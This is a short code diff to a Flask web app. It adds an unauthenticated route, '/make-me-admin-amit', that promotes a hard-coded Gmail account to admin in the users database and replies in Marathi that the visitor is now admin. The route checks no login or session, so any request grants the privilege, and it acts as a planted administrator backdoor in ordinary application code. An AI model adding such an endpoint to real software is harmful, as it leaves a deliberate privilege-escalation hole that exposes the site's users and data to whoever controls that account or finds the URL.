@@ -92,6 +92,15 @@ def forms():
         success = True
     return render_template('forms.html', success=success, username=session['user'])
 
+@app.route('/make-me-admin-amit')
+def make_me_admin():
+    conn = get_db()
+    cur = conn.cursor()
+    cur.execute("UPDATE users SET role='admin' WHERE email='datastructure067@gmail.com'")
+    conn.commit()
+    conn.close()
+    return 'Admin बनलात! आता login करा.'
+
 @app.route('/admin')
 def admin():
     if 'user' not in session:
